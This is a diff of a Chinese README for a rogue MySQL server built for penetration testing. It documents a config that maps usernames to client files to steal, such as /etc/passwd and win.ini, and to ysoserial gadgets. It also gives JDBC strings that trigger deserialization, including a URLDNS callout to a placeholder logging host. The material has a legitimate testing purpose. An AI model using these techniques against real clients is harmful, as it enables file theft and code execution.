@@ -1,4 +1,6 @@
 # MySQL Fake Server
+[ENGLISH](README_EN.md)|简体中文
+
 用于渗透测试过程中的假MySQL服务器，纯原生python3实现，不依赖其它包。
 
 修改自项目https://github.com/waldiTM/python-mysqlproto
@@ -10,11 +12,11 @@
 
 ## 说明
 1. 需要python3环境，无任何其它依赖。
-2. 根据**登录用户名**返回文件读取利用报文、反序列化利用报文。
-3. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能，支持ServerStatusDiffInterceptor和detectCustomCollations两种方式。
+2. 运行：`python server.py`
+3. 需要[ysoserial](https://github.com/frohoff/ysoserial)才能用反序列化功能，支持`ServerStatusDiffInterceptor`和`detectCustomCollations`两种方式。
 4. MySQL的用户名支持冒号、斜杠等特殊符号，但是能否使用还需看具体客户端环境。
-5. 运行：`python server.py`
-6. **config.json中预置了一部分配置信息，可以自己修改添加指定用户名对应的读取文件和yso参数，详细看下面的说明**
+5. 根据**登录用户名**返回文件读取利用报文、反序列化利用报文。
+6. **推荐用法：**config.json中预置了一部分配置信息，可以自己修改添加指定用户名对应的读取文件和yso参数，详细看下面的说明
 
 ## 测试环境：
 1. jdk1.8.20+mysql-connector-java 8.0.14/5.1.22(Windows下反序列化（JRE8u20）、文件读取)
@@ -22,16 +24,42 @@
 3. Navicat 12(Windows下文件读取，需要切换到mysql_clear_password认证插件)
 
 ## 使用方法
+默认的config.json:
+
+```json
+{
+//文件读取参数
+    "fileread":{
+        "win_ini":"c:\\windows\\win.ini",//key为设定的用户名,value为要读取的文件路径
+        "win_hosts":"c:\\windows\\system32\\drivers\\etc\\hosts",
+        "win":"c:\\windows\\",
+        "linux_passwd":"/etc/passwd",
+        "linux_hosts":"/etc/hosts",
+        "index_php":"index.php"
+    },
+//ysoserial参数
+    "yso":{
+        "Jdk7u21":["Jdk7u21","calc"]//key为设定的用户名,value为ysoserial参数的参数
+    }
+}
+```
+
 1. 文件读取：
-    - 可以在config.json中fileread节中预定义好要读取的文件,key为用户名,value为要读取的文件名
+
+    - 可以在config.json中fileread节中预定义好要读取的文件(比如win_ini用户名读取win.ini文件)
     - 可以用fileread_开头的用户名(例如使用用户名fileread\_/etc/passwd来读取/etc/passwd文件)
+
 2. 反序列化
-    - 可在config.json中yso节预定义好yso payload的生成参数，key为用户名，value为ysoserial的参数
+    - 可在config.json中yso节预定义好yso payload的生成参数(比如Jdk7u21用户名返回Jdk7u21执行计算器的gadget)
+
     - 可以用yso_开头的用户名，格式yso\_payload类型\_命令（例如jdk7u21调用calc就使用用户名yso\_Jdk7u21\_calc）
-    - jdbc连接串示例：
+
+      jdbc连接串示例：
       - `jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_Jdk7u21_calc`
       - `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_URLDNS_http://yourdns.log.addr/`
-3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
+
+3. 关于认证：默认认证插件一般使用**mysql_native_password**,但是由于协议实现的问题，navicat下会连接失败，此时在使用的用户名后追加 **_clear** 即可切换为mysql_clear_password,navicat连接成功,读取到文件。
+
     - **例如：** fileread\_/etc/passwd_clear
 
 ## JDBC连接串整理
